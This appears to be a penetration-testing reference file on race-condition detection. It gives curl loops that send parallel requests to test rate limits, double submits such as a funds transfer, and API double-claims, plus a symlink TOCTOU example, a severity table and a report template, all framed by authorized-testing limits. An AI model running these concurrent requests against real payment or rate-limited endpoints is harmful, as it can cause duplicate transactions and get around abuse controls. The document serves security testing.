# Race Condition Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify race condition vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual resource abuse is prohibited
> - Race condition payloads are for understanding attack surface only, **no double-spending or privilege escalation**
> - Validation proves vulnerability existence (timing window detected), **no exploitation of TOCTOU flaws**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PortSwigger, PayloadsAllTheThings

## Manual Testing

**Note: Use concurrent requests to detect race windows, not to exploit them**

---

## Validation Objectives (Within Security Boundary)

Race condition validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| TOCTOU Detection | ✓ Send concurrent requests, observe inconsistency | - | Exploit time-of-check-time-of-use |
| Rate Limit Bypass | ✓ Parallel requests to exceed limit | - | Abuse rate-limited endpoints |
| Double-Submit Detection | ✓ Send identical requests simultaneously | - | Double-spend or double-apply |
| Lock Contention | ✓ Observe error under concurrent access | - | Exploit database deadlocks |

**Safe Validation Method**: Send concurrent requests with harmless payloads and observe inconsistencies; do not exploit race windows for financial or privilege gains.

---

## Detection Methods

### Concurrent Request Method (curl)

```bash
# Send N requests simultaneously
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/endpoint" &
done
wait

# Check for:
# - Different status codes (inconsistent response)
# - Duplicate successful operations
# - Rate limit not enforced
```

### Rate Limit Bypass

```bash
# Sequential (should be limited)
for i in $(seq 1 20); do
  echo "Request $i: $(curl -s -o /dev/null -w '%{http_code}' 'https://target.com/api/endpoint')"
done

# Parallel (may bypass limit)
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" 'https://target.com/api/endpoint' &
done
wait

# If parallel requests succeed but sequential are limited: race condition
```

### Double-Submit Detection

```bash
# Test if form submission can be duplicated
# Use parallel requests to submit same form
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/transfer" \
    -d "amount=100&to=account123" &
done
wait

# Check if transfer was applied multiple times
# (SAFE: use test account with test currency)
```

### TOCTOU File Operation

```bash
# Test if file operations have race window
# Create symlink race
ln -sf /tmp/target /tmp/link
# Concurrent: one process checks file, another replaces it
# This demonstrates TOCTOU concept only
```

### API Race Condition

```bash
# Test API endpoint for race conditions
# Send concurrent POST requests
seq 1 10 | xargs -P10 -I{} curl -s -X POST \
  "https://target.com/api/resource" \
  -H "Content-Type: application/json" \
  -d '{"action": "claim"}' \
  -o /dev/null -w "Request {}: %{http_code}\n"

# If multiple return 200: potential double-claim
```

---

## Analysis Process

1. Identify state-changing endpoints
2. Send sequential requests (baseline behavior)
3. Send concurrent requests (10-20 parallel)
4. Compare responses for inconsistencies
5. Check if rate limits are bypassed
6. Check if operations are applied multiple times
7. **Stop validation**, document race window
8. Do not exploit for financial or privilege gains

---

## Severity Classification

| Race Type | Default Severity | Reason |
|-----------|------------------|--------|
| Double-spend/payment | Critical | Financial impact |
| Privilege escalation | High | Unauthorized access gain |
| Rate limit bypass | Medium | Enables brute force |
| Duplicate resource creation | Medium | Data integrity issue |
| Information leak via timing | Low | Limited direct impact |

---

## Output

```markdown
## Vulnerability: Race Condition

### Location
{URL} - Endpoint: {endpoint}

### Race Type
{TOCTOU / Rate Limit Bypass / Double-Submit / Lock Contention}

### Evidence
- Baseline: {sequential behavior}
- Concurrent: {parallel behavior observed}
- Inconsistency: {what diverged}
- Window: {timing observation}

### Validation Result
- Race condition confirmed: {yes/no}
- Type: {specific race type}
- Impact: {financial / access / data integrity}

### Risk Level
{Medium} - Rate limit bypass confirmed, no financial exploitation
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Double-spend | Do not exploit payment race conditions |
| ❌ Escalate privileges | Do not exploit race for unauthorized access |
| ❌ Abuse resources | Do not create duplicate resources at scale |
| ❌ Exploit deadlocks | Do not intentionally trigger database deadlocks |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `templates/severity-classification.md` -> Race condition severity rules
